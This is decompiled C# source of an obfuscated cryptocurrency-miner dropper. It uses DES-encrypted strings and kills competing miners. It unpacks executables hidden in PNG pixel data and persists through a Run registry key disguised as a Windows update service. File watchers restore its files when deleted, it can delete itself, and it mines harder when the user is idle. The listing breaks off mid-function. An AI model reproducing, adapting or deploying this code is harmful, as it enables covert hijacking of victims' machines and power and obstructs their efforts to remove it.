using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace nObccFNERDrOuFDFCKrV;

internal class Program
{
	private static int GdPGmbykHJbgKtMViEZU = 1;

	private static int IzUnJsGMZRcKUXzXjCUb = 0;

	private static int EdLhSMANUPLRlgwXCQMS = 0;

	private static bool ScWFlCrgXMZPjpRcgGId = false;

	private static bool VDWCaRvSBWxHrNRQAroJ = false;

	private static bool reg_PfUIVvSQPKIRnZdUQAMC = true;

	private static string tAdLInDnkFaMSqrKxBLf = "";

	private static byte[] MoGIWDSFXlKkDWSHLJBZ = null;

	private static string bJDIXSRVzBHUSzFkLxDm = "";

	private static string maNDIKmyVgEMYyXmKkLq = "";

	private static WebClient SmbQTRZAEgCGwwRaIhDI = new WebClient();

	private static string obPVxcMKKWVHlzHtkJRq = "";

	private static string NAHAGIPbsSioEjNiGZii = "";

	private static string AEhvQGmQGRfTsFLpJAmS = "";

	private static string VdPbRuyNdyLLgMYlNICZ = "";

	private static string UATFnMLlTdfdIYKLMkiY = "";

	private static string shRRaIEJFxlgqJQTTAGMu = "";

	private static string uZmnJjKPJdRLjQEAXjbH = "";

	private static string SMooZVSNmMlqKODCBhAc = "";

	private static string sHBxtsJzDEnHALgAitbZD = "";

	private static string scGCrNKRnpzyXFtbrEBRr = "";

	private static string cGCrNKRnpzyXFtbrEBRrIP = "";

	private static string VjvFFNLKTIFTMUASUTCS = "";

	private static string sCefPlSLxBFArqXmKnVZR = "";

	private static string sPfUIVvSQPKIRnZdUQAMC = "";

	private static string ssHDLoOYjNtIJMrtYtrGE = "";

	private static string sZXHwKGKzXGkLDzHsCKZQ = "";

	private static byte[] HhQZOQMORGOtefiTNfVD = null;

	private static byte[] HhQZOQMORGOtefiTNfVD2 = null;

	private static byte[] CKYOREVEjIwLBgQkrBxS = Encoding.ASCII.GetBytes("DbMthuPD");

	private static bool hRRaIEJFxlgqJQTTAGMu;

	private static bool HBxtsJzDEnHALgAitbZD;

	private static bool cGCrNKRnpzyXFtbrEBRr;

	private static bool CefPlSLxBFArqXmKnVZR;

	private static bool PfUIVvSQPKIRnZdUQAMC;

	private static bool sHDLoOYjNtIJMrtYtrGE;

	private static bool ZXHwKGKzXGkLDzHsCKZQ;

	private static List<string> proc = new List<string>();

	private static string OlNEtfXVWMYWpldQadKT = "";

	private static string p = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ebdYePdrDCZOZfDQgbFL("WS4gNVaO7/9PzvCk38ScBRqWt+gzz1xN");

	private static int atDVkiKABXrCEfiuWzHJ = 50;

	[CompilerGenerated]
	private static ThreadStart _003C_003E9__CachedAnonymousMethodDelegate3;

	[CompilerGenerated]
	private static ThreadStart _003C_003E9__CachedAnonymousMethodDelegate4;

	[CompilerGenerated]
	private static ThreadStart _003C_003E9__CachedAnonymousMethodDelegate5;

	private static void Main()
	{
		if (YTqwQlYYYUpyIsZLNZyW())
		{
			umzBOKtrXEPrQuZtELYL();
		}
		if (WTPlITKRIzwRUDrfDkXW())
		{
			umzBOKtrXEPrQuZtELYL();
		}
		if (checkSoviet())
		{
			umzBOKtrXEPrQuZtELYL();
		}
		if (checkInsidiousAndGeneral())
		{
			umzBOKtrXEPrQuZtELYL();
		}
		OdfIFZKfMYaVDVUKJcGL();
		UATFnMLlTdfdIYKLMkiY = "8";
		shRRaIEJFxlgqJQTTAGMu = "true";
		uZmnJjKPJdRLjQEAXjbH = ebdYePdrDCZOZfDQgbFL("faa51T5ydNZ9suXyk/quMLLH61x2VQHIFX06FcGzyhg=");
		SMooZVSNmMlqKODCBhAc = ebdYePdrDCZOZfDQgbFL("Gwmie2KR8Xz+jEzNnZchIYmkIrciBZIZ");
		sHBxtsJzDEnHALgAitbZD = "true";
		scGCrNKRnpzyXFtbrEBRr = "[PROXY]";
		cGCrNKRnpzyXFtbrEBRrIP = "[IPROXY]:[PPROXY]";
		VjvFFNLKTIFTMUASUTCS = "10";
		sCefPlSLxBFArqXmKnVZR = "[MELT]";
		sPfUIVvSQPKIRnZdUQAMC = "true";
		ssHDLoOYjNtIJMrtYtrGE = "true";
		sZXHwKGKzXGkLDzHsCKZQ = "true";
		hRRaIEJFxlgqJQTTAGMu = tYQMCSLnsFMqDBYKIwGn(shRRaIEJFxlgqJQTTAGMu);
		HBxtsJzDEnHALgAitbZD = tYQMCSLnsFMqDBYKIwGn(sHBxtsJzDEnHALgAitbZD);
		cGCrNKRnpzyXFtbrEBRr = tYQMCSLnsFMqDBYKIwGn(scGCrNKRnpzyXFtbrEBRr);
		CefPlSLxBFArqXmKnVZR = tYQMCSLnsFMqDBYKIwGn(sCefPlSLxBFArqXmKnVZR);
		PfUIVvSQPKIRnZdUQAMC = tYQMCSLnsFMqDBYKIwGn(sPfUIVvSQPKIRnZdUQAMC);
		sHDLoOYjNtIJMrtYtrGE = tYQMCSLnsFMqDBYKIwGn(ssHDLoOYjNtIJMrtYtrGE);
		ZXHwKGKzXGkLDzHsCKZQ = tYQMCSLnsFMqDBYKIwGn(sZXHwKGKzXGkLDzHsCKZQ);
		obPVxcMKKWVHlzHtkJRq = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ebdYePdrDCZOZfDQgbFL("qeO1DBwu2GE=");
		NAHAGIPbsSioEjNiGZii = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ebdYePdrDCZOZfDQgbFL("WS4gNVaO7/9PzvCk38ScBRqWt+gzz1xN");
		AEhvQGmQGRfTsFLpJAmS = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		VdPbRuyNdyLLgMYlNICZ = AEhvQGmQGRfTsFLpJAmS + ebdYePdrDCZOZfDQgbFL("GGwKr8vKMuo=");
		bJDIXSRVzBHUSzFkLxDm = VdPbRuyNdyLLgMYlNICZ;
		if (HBxtsJzDEnHALgAitbZD)
		{
			WKDTERwNHiGUxWvkayAT();
		}
		IOnOXxvsXVfVSwLCXlQD();
		KhJZHDIBNWBiAVLTFyBC();
		if (PfUIVvSQPKIRnZdUQAMC)
		{
			ZDFDqOxCTGETIUTTDoAU();
		}
		if (CefPlSLxBFArqXmKnVZR)
		{
			UjOcAHMRIvjpTDzyjIOq();
		}
	}

	public static string ebdYePdrDCZOZfDQgbFL(string cryptedString)
	{
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		MemoryStream stream = new MemoryStream(Convert.FromBase64String(cryptedString));
		CryptoStream stream2 = new CryptoStream(stream, dESCryptoServiceProvider.CreateDecryptor(CKYOREVEjIwLBgQkrBxS, CKYOREVEjIwLBgQkrBxS), CryptoStreamMode.Read);
		StreamReader streamReader = new StreamReader(stream2);
		return streamReader.ReadToEnd();
	}

	private static void OdfIFZKfMYaVDVUKJcGL()
	{
		OlNEtfXVWMYWpldQadKT = "";
		try
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				try
				{
					string text = process.MainModule!.FileVersionInfo.FileDescription!.ToLower();
					if (text.Contains("MoGIWDSFXlKkDWSHLJBZsoft") || text.Contains("coin-miner") || text.Contains("coinminer"))
					{
						proc.Add(process.ProcessName);
					}
				}
				catch
				{
				}
			}
			umzBOKtrXEPrQuZtELYL();
		}
		catch
		{
		}
	}

	private static void umzBOKtrXEPrQuZtELYL()
	{
		try
		{
			string[] array = proc.ToArray();
			foreach (string processName in array)
			{
				if (Process.GetProcessesByName(processName).Length >= 1)
				{
					Process[] processesByName = Process.GetProcessesByName(processName);
					Process[] array2 = processesByName;
					foreach (Process process in array2)
					{
						process.Kill();
					}
				}
			}
		}
		catch
		{
		}
		try
		{
			if (OlNEtfXVWMYWpldQadKT != "")
			{
				if (YTqwQlYYYUpyIsZLNZyW())
				{
					JVqDNYHEkNrNHhdfqOOb(OlNEtfXVWMYWpldQadKT);
				}
				if (WTPlITKRIzwRUDrfDkXW())
				{
					JVqDNYHEkNrNHhdfqOOb(OlNEtfXVWMYWpldQadKT);
					File.Delete(Path.GetTempPath() + "\\winupdater.exe");
				}
				if (checkSoviet())
				{
					JVqDNYHEkNrNHhdfqOOb(OlNEtfXVWMYWpldQadKT);
				}
				if (checkInsidiousAndGeneral())
				{
					JVqDNYHEkNrNHhdfqOOb(OlNEtfXVWMYWpldQadKT);
				}
			}
		}
		catch
		{
		}
		proc.Clear();
	}

	private static void JVqDNYHEkNrNHhdfqOOb(string dir)
	{
		Directory.Delete(dir, recursive: true);
	}

	private static bool YTqwQlYYYUpyIsZLNZyW()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string[] directories = Directory.GetDirectories(folderPath);
		string[] array = directories;
		foreach (string text in array)
		{
			if (!text.Contains("Windows"))
			{
				continue;
			}
			string[] directories2 = Directory.GetDirectories(text);
			foreach (string text2 in directories2)
			{
				if (!text2.Contains("macro"))
				{
					continue;
				}
				OlNEtfXVWMYWpldQadKT = text;
				proc.Add("wscript");
				string[] files = Directory.GetFiles(text);
				foreach (string text3 in files)
				{
					if (text3.EndsWith(".exe"))
					{
						proc.Add(text3.Substring(text3.LastIndexOf("\\") + 1).Replace(".exe", ""));
					}
				}
				return true;
			}
		}
		return false;
	}

	private static bool checkInsidiousAndGeneral()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string[] directories = Directory.GetDirectories(folderPath);
		string[] array = directories;
		foreach (string text in array)
		{
			if (text.Length != 5)
			{
				continue;
			}
			string[] files = Directory.GetFiles(text);
			string[] array2 = files;
			foreach (string text2 in array2)
			{
				if (text2.EndsWith(".exe"))
				{
					proc.Add(text2.Substring(text2.LastIndexOf("\\") + 1).Replace(".exe", ""));
				}
				switch (text2)
				{
				case "libcurl-4.dll":
					OlNEtfXVWMYWpldQadKT = text;
					return true;
				case "btc-evergreen.il":
					OlNEtfXVWMYWpldQadKT = text;
					return true;
				case "interop.coineng.dll":
					OlNEtfXVWMYWpldQadKT = text;
					return true;
				}
			}
		}
		proc.Clear();
		return false;
	}

	private static bool checkSoviet()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Intel";
		if (Directory.Exists(text) && File.Exists(text + ebdYePdrDCZOZfDQgbFL("MDqshXlakVXO8OMofRLJog==")))
		{
			OlNEtfXVWMYWpldQadKT = text;
			string[] files = Directory.GetFiles(text);
			string[] array = files;
			int num = 0;
			if (0 < array.Length)
			{
				string text2 = array[num];
				if (text2.EndsWith(".exe"))
				{
					proc.Add(text2.Substring(text2.LastIndexOf("\\") + 1).Replace(".exe", ""));
				}
				return true;
			}
		}
		return false;
	}

	private static bool WTPlITKRIzwRUDrfDkXW()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Update Drivers";
		string tempPath = Path.GetTempPath();
		if (File.Exists(tempPath + "\\winupdater.exe") && File.Exists(text + "\\micromgr.exe"))
		{
			OlNEtfXVWMYWpldQadKT = text;
			proc.Add("micromgr");
			proc.Add("winupdater");
			return true;
		}
		return false;
	}

	public static byte[] fIAMSTGYciWyITNEOLqQ(string image_in)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(image_in);
		Bitmap data = new Bitmap(manifestResourceStream);
		manifestResourceStream.Close();
		return KNwnShNGtUDMUzYSvkkM(data);
	}

	public static byte[] KNwnShNGtUDMUzYSvkkM(Bitmap data)
	{
		List<byte> list = new List<byte>();
		for (int i = 0; i < ((Image)data).get_Width(); i++)
		{
			for (int j = 0; j < ((Image)data).get_Height(); j++)
			{
				Color pixel = data.GetPixel(i, j);
				if (pixel != Color.FromArgb(0, 0, 0, 0))
				{
					list.Add(pixel.R);
					list.Add(pixel.G);
					list.Add(pixel.B);
				}
			}
		}
		return YXIMINaEfQKALUqIcKHB(list.ToArray());
	}

	private static byte[] YXIMINaEfQKALUqIcKHB(byte[] zippedData)
	{
		byte[] array = null;
		using MemoryStream memoryStream = new MemoryStream();
		using (MemoryStream stream = new MemoryStream(zippedData))
		{
			using GZipStream source = new GZipStream(stream, CompressionMode.Decompress);
			LABqNPPgYGLsKjPhFKdP(source, memoryStream);
		}
		return memoryStream.ToArray();
	}

	private static void LABqNPPgYGLsKjPhFKdP(Stream source, Stream destination)
	{
		byte[] array = new byte[2048];
		int count;
		while ((count = source.Read(array, 0, array.Length)) > 0)
		{
			destination.Write(array, 0, count);
		}
	}

	private static void WKDTERwNHiGUxWvkayAT()
	{
		if (!(Application.get_ExecutablePath() != NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw==")))
		{
			return;
		}
		try
		{
			if (File.Exists(NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw==")))
			{
				File.Delete(NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw=="));
			}
			File.Copy(Application.get_ExecutablePath(), NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw=="));
			Process.Start(NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw=="));
			if (!CefPlSLxBFArqXmKnVZR)
			{
				Process.GetCurrentProcess().Kill();
			}
			else
			{
				UjOcAHMRIvjpTDzyjIOq();
			}
		}
		catch
		{
		}
	}

	private static void KhJZHDIBNWBiAVLTFyBC()
	{
		try
		{
			if (File.Exists(NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("6Lf2j4NGtU8bW49VMQm/Hg==")))
			{
				File.Delete(NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("6Lf2j4NGtU8bW49VMQm/Hg=="));
			}
			File.WriteAllBytes(NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("6Lf2j4NGtU8bW49VMQm/Hg=="), fIAMSTGYciWyITNEOLqQ("oQNvXRNnue.png"));
			Process.Start(NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("6Lf2j4NGtU8bW49VMQm/Hg=="));
		}
		catch
		{
		}
	}

	private static void ZDFDqOxCTGETIUTTDoAU()
	{
		EDlduuSDzqIpKFmCRDPT();
		if (HBxtsJzDEnHALgAitbZD)
		{
			Registry.CurrentUser.OpenSubKey(ebdYePdrDCZOZfDQgbFL("D6xfpgZPa+v0tEzAoHFb50XSr5LBQolx+WvjfitSXrJblmP8i4oA5EoEJe7/fp3O"), writable: true)!.SetValue(ebdYePdrDCZOZfDQgbFL("q8u/BfKd9sfEVMKdgsW6b3KOnmSZ1cBC"), NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw=="));
		}
	}

	private static void UjOcAHMRIvjpTDzyjIOq()
	{
		if (Application.get_ExecutablePath() != NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw=="))
		{
			string text = "";
			text = ebdYePdrDCZOZfDQgbFL("+GN6g6Xu+5KAgQAF1FhYH++2roAOC/FJpxfgAK4uBqxnOT6j1/GB3Q==") + '"' + Application.get_ExecutablePath() + '"';
			QSWVmFLiTVoqZQTNHWQQ(text, wait: false);
			Process currentProcess = Process.GetCurrentProcess();
			try
			{
				currentProcess.Kill();
			}
			catch (Exception)
			{
			}
		}
	}

	private static void CEAYHSwEbaPLURCYEWFF()
	{
		KhJZHDIBNWBiAVLTFyBC();
	}

	private static string ATUrOMwWgLECjtRORpPu()
	{
		string s = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ebdYePdrDCZOZfDQgbFL("ydWemcT3ufUwy4QW6tyBu/CzS6jMSe55");
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append("-o " + uZmnJjKPJdRLjQEAXjbH);
		stringBuilder.Append(" -u " + SMooZVSNmMlqKODCBhAc.Split(new char[1] { ':' })[0]);
		stringBuilder.Append(" -p " + SMooZVSNmMlqKODCBhAc.Split(new char[1] { ':' })[1]);
		if (!hRRaIEJFxlgqJQTTAGMu)
		{
			stringBuilder.Append(" -g no");
		}
		else
		{
			stringBuilder.Append(" -g yes");
		}
		stringBuilder.Append(" -I " + VjvFFNLKTIFTMUASUTCS);
		if (cGCrNKRnpzyXFtbrEBRr)
		{
			stringBuilder.Append(" -x " + cGCrNKRnpzyXFtbrEBRrIP);
		}
		if (!ZXHwKGKzXGkLDzHsCKZQ)
		{
			stringBuilder.Append(" -t " + UATFnMLlTdfdIYKLMkiY);
		}
		else
		{
			stringBuilder.Append(" -t " + QoBjJWhQvOZsLGugUMkF());
		}
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(s)) + "," + Convert.ToBase64String(Encoding.UTF8.GetBytes(stringBuilder.ToString())) + "," + Convert.ToBase64String(Encoding.UTF8.GetBytes("xss"));
	}

	private static string QoBjJWhQvOZsLGugUMkF()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			int num = 0;
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(ebdYePdrDCZOZfDQgbFL("3dzLPeIkJOGr92IfzydIeBptti0+MHjcAT86BTHiCb0=")).Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					num += int.Parse(current.get_Item(ebdYePdrDCZOZfDQgbFL("YAusZOsYzgNtlSE2iAC3Sg==")).ToString());
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return num switch
			{
				1 => "1", 
				2 => "1", 
				3 => "2", 
				4 => "2", 
				5 => "3", 
				6 => "3", 
				7 => "4", 
				8 => "4", 
				9 => "5", 
				10 => "5", 
				_ => "6", 
			};
		}
		catch
		{
			return "2";
		}
	}

	private static void IOnOXxvsXVfVSwLCXlQD()
	{
		try
		{
			if (!Directory.Exists(VdPbRuyNdyLLgMYlNICZ))
			{
				Directory.CreateDirectory(VdPbRuyNdyLLgMYlNICZ);
			}
			if (!Directory.Exists(AEhvQGmQGRfTsFLpJAmS + "\\Microsoft"))
			{
				Directory.CreateDirectory(AEhvQGmQGRfTsFLpJAmS + "\\Microsoft");
			}
			if (!Directory.Exists(NAHAGIPbsSioEjNiGZii))
			{
				Directory.CreateDirectory(NAHAGIPbsSioEjNiGZii);
			}
			if (File.Exists(VdPbRuyNdyLLgMYlNICZ + ebdYePdrDCZOZfDQgbFL("MDqshXlakVXO8OMofRLJog==")))
			{
				try
				{
					File.Delete(VdPbRuyNdyLLgMYlNICZ + ebdYePdrDCZOZfDQgbFL("MDqshXlakVXO8OMofRLJog=="));
				}
				catch
				{
				}
			}
			try
			{
				File.WriteAllBytes(VdPbRuyNdyLLgMYlNICZ + ebdYePdrDCZOZfDQgbFL("MDqshXlakVXO8OMofRLJog=="), Encoding.ASCII.GetBytes(Convert.ToBase64String(fIAMSTGYciWyITNEOLqQ("bWhBUOyotX.png"))));
			}
			catch
			{
			}
			try
			{
				if (File.Exists(NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q")))
				{
					File.Delete(NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q"));
				}
				File.WriteAllText(NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q"), ATUrOMwWgLECjtRORpPu());
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	private static bool tYQMCSLnsFMqDBYKIwGn(string arg1)
	{
		return arg1 == "true";
	}

	public static bool QSWVmFLiTVoqZQTNHWQQ(string Command, bool wait)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = ebdYePdrDCZOZfDQgbFL("CwcCkNIu7vo=");
			process.StartInfo.Arguments = " /C " + Command;
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.RedirectStandardOutput = false;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
			if (wait)
			{
				process.WaitForExit();
			}
			process.Close();
			return true;
		}
		catch
		{
			return false;
		}
	}

	private static void EDlduuSDzqIpKFmCRDPT()
	{
		try
		{
			tAdLInDnkFaMSqrKxBLf = File.ReadAllText(p + ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q"));
		}
		catch
		{
		}
		try
		{
			MoGIWDSFXlKkDWSHLJBZ = File.ReadAllBytes(bJDIXSRVzBHUSzFkLxDm + ebdYePdrDCZOZfDQgbFL("MDqshXlakVXO8OMofRLJog=="));
		}
		catch
		{
		}
		try
		{
			uZmnJjKPJdRLjQEAXjbH = Encoding.UTF8.GetString(Convert.FromBase64String(File.ReadAllText(p + ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q")).Split(new char[1] { ',' })[2]));
		}
		catch
		{
		}
		if (!PfUIVvSQPKIRnZdUQAMC)
		{
			reg_PfUIVvSQPKIRnZdUQAMC = false;
		}
		if (reg_PfUIVvSQPKIRnZdUQAMC)
		{
			new Thread((ThreadStart)delegate
			{
				JOXnZfTIYLBfVftCWkXW();
			}).Start();
		}
		_PfUIVvSQPKIRnZdUQAMC();
		if (!sHDLoOYjNtIJMrtYtrGE)
		{
			new Thread((ThreadStart)delegate
			{
				vJYZNIsKNUipQFKlAqOp();
			}).Start();
			return;
		}
		maNDIKmyVgEMYyXmKkLq = ufvMNnZMEJnGWoAYoZxK();
		new Thread((ThreadStart)delegate
		{
			while (true)
			{
				qIWRIHBtUIRrrtOGyrJt();
				Thread.Sleep(5000);
			}
		}).Start();
	}

	private static void JOXnZfTIYLBfVftCWkXW()
	{
		while (true)
		{
			string[] valueNames = Registry.CurrentUser.OpenSubKey(ebdYePdrDCZOZfDQgbFL("D6xfpgZPa+v0tEzAoHFb50XSr5LBQolx+WvjfitSXrJblmP8i4oA5EoEJe7/fp3O"), writable: true)!.GetValueNames();
			bool flag = false;
			string[] array = valueNames;
			foreach (string text in array)
			{
				if (text.ToLower().Contains("win update service"))
				{
					flag = true;
				}
			}
			if (!flag)
			{
				string value = p + ebdYePdrDCZOZfDQgbFL("xjx5feHpdLf6JJv9rj8Kkw==");
				Registry.CurrentUser.OpenSubKey(ebdYePdrDCZOZfDQgbFL("D6xfpgZPa+v0tEzAoHFb50XSr5LBQolx+WvjfitSXrJblmP8i4oA5EoEJe7/fp3O"), writable: true)!.SetValue(ebdYePdrDCZOZfDQgbFL("q8u/BfKd9sfEVMKdgsW6b3KOnmSZ1cBC"), value);
			}
			Thread.Sleep(30000);
		}
	}

	private static int QOLZSmaPeCjBVBRvgWcO()
	{
		int num = 1;
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.Contains("vbc"))
			{
				num--;
			}
		}
		return num;
	}

	public static void _PfUIVvSQPKIRnZdUQAMC()
	{
		FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
		fileSystemWatcher.Path = p;
		fileSystemWatcher.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.LastAccess;
		fileSystemWatcher.Filter = "*.exe";
		fileSystemWatcher.Deleted += OnChanged2;
		fileSystemWatcher.Renamed += OnRenamed;
		fileSystemWatcher.EnableRaisingEvents = true;
		FileSystemWatcher fileSystemWatcher2 = new FileSystemWatcher();
		fileSystemWatcher2.Path = bJDIXSRVzBHUSzFkLxDm;
		fileSystemWatcher2.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.LastAccess;
		fileSystemWatcher2.Filter = "*.exe";
		fileSystemWatcher2.Deleted += OnChanged2;
		fileSystemWatcher2.Renamed += OnRenamed;
		fileSystemWatcher2.EnableRaisingEvents = true;
		FileSystemWatcher fileSystemWatcher3 = new FileSystemWatcher();
		fileSystemWatcher3.Path = p;
		fileSystemWatcher3.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.LastAccess;
		fileSystemWatcher3.Filter = "*.txt";
		fileSystemWatcher3.Deleted += OnChanged3;
		fileSystemWatcher3.Renamed += OnRenamed;
		fileSystemWatcher3.EnableRaisingEvents = true;
	}

	private static void OnChanged3(object sender, FileSystemEventArgs e)
	{
		if (e.ChangeType.ToString() == "Deleted" && e.FullPath.ToLower().EndsWith(ebdYePdrDCZOZfDQgbFL("VR3vU9HntydKElnPf5Reyw==")))
		{
			File.WriteAllText(e.FullPath, tAdLInDnkFaMSqrKxBLf);
		}
	}

	private static void OnRenamed(object sender, RenamedEventArgs e)
	{
		if (!VDWCaRvSBWxHrNRQAroJ)
		{
			Thread.Sleep(100);
			File.Move(e.FullPath, e.OldFullPath);
			VDWCaRvSBWxHrNRQAroJ = true;
		}
		else
		{
			VDWCaRvSBWxHrNRQAroJ = false;
		}
	}

	private static void OnChanged2(object sender, FileSystemEventArgs e)
	{
		if (!(e.ChangeType.ToString() == "Deleted"))
		{
			return;
		}
		if (e.FullPath.ToLower().EndsWith("rundll32.exe"))
		{
			if (MoGIWDSFXlKkDWSHLJBZ != null)
			{
				File.WriteAllBytes(e.FullPath, MoGIWDSFXlKkDWSHLJBZ);
			}
			else
			{
				File.WriteAllBytes(e.FullPath, Encoding.ASCII.GetBytes(Convert.ToBase64String(fIAMSTGYciWyITNEOLqQ("bWhBUOyotX.png"))));
			}
		}
		if (e.FullPath.ToLower().EndsWith(ebdYePdrDCZOZfDQgbFL("SzUtJGf+g9iawXQMBtS2MQ==")))
		{
			File.WriteAllBytes(NAHAGIPbsSioEjNiGZii + ebdYePdrDCZOZfDQgbFL("6Lf2j4NGtU8bW49VMQm/Hg=="), fIAMSTGYciWyITNEOLqQ("oQNvXRNnue.png"));
		}
	}

	public static void vJYZNIsKNUipQFKlAqOp()
	{
		while (true)
		{
			if (atDVkiKABXrCEfiuWzHJ == 0)
			{
				if (QOLZSmaPeCjBVBRvgWcO() == 1)
				{
					KhJZHDIBNWBiAVLTFyBC();
				}
				atDVkiKABXrCEfiuWzHJ = 550;
			}
			atDVkiKABXrCEfiuWzHJ--;
			Thread.Sleep(50);
		}
	}

	private static void AiuzGaMsufJpCQPOyeLC(string thread_count)
	{
		try
		{
			string text = File.ReadAllText(p + ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q")).Split(new char[1] { ',' })[0];
			string text2 = File.ReadAllText(p + ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q")).Split(new char[1] { ',' })[2];
			string @string = Encoding.UTF8.GetString(Convert.FromBase64String(File.ReadAllText(p + ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q")).Split(new char[1] { ',' })[1]));
			string s = @string.Substring(0, @string.Length - ufvMNnZMEJnGWoAYoZxK().Length) + thread_count;
			File.WriteAllText(p + ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q"), text + ',' + Convert.ToBase64String(Encoding.UTF8.GetBytes(s)) + ',' + text2);
		}
		catch
		{
		}
	}

	private static string ufvMNnZMEJnGWoAYoZxK()
	{
		string result = "";
		try
		{
			string @string = Encoding.UTF8.GetString(Convert.FromBase64String(File.ReadAllText(p + ebdYePdrDCZOZfDQgbFL("MLqsLM/r1/EiQm3J1aU4U7gdtFkq7K1Q")).Split(new char[1] { ',' })[1]));
			result = @string.Substring(@string.LastIndexOf('-') + 3);
			return result;
		}
		catch
		{
			return result;
		}
	}

	private static void QjZJxdNPgoAtFzuxipFV()
	{
		try
		{
			if (QOLZSmaPeCjBVBRvgWcO() == 0 && !ScWFlCrgXMZPjpRcgGId)
			{
				Process.GetProcessesByName("vbc")[0].Kill();
			}
		}
		catch
		{
		}
		if (!ScWFlCrgXMZPjpRcgGId)
		{
			AiuzGaMsufJpCQPOyeLC("8");
			ScWFlCrgXMZPjpRcgGId = true;
			Thread.Sleep(500);
		}
		if (QOLZSmaPeCjBVBRvgWcO() == 1)
		{
			KhJZHDIBNWBiAVLTFyBC();
		}
	}

	private static void VttUYrBVGGVnrGGaoUBX()
	{
		try
		{
			if (QOLZSmaPeCjBVBRvgWcO() == 0 && ScWFlCrgXMZPjpRcgGId)
			{
				Process.GetProcessesByName("vbc")[0].Kill();
			}
		}
		catch
		{
		}
		if (ScWFlCrgXMZPjpRcgGId)
		{
			AiuzGaMsufJpCQPOyeLC(maNDIKmyVgEMYyXmKkLq);
			ScWFlCrgXMZPjpRcgGId = false;
		}
		if (QOLZSmaPeCjBVBRvgWcO() == 1)
		{
			KhJZHDIBNWBiAVLTFyBC();
		}
	}

	private static void qIWRIHBtUIRrrtOGyrJt()
	{
		if (IzUnJsGMZRcKUXzXjCUb == Cursor.get_Position().X && EdLhSMANUPLRlgwXCQMS == Cursor.get_Position().Y)
		{
			GdPGmbykHJbgKtMViEZU++;
			if (GdPGmbykHJbgKtMViEZU > 60)
			{
				QjZJxdNPgoAtFzuxipFV();
			}
		}
		else
		{
			VttUYrBVGGVnrGGaoUBX();
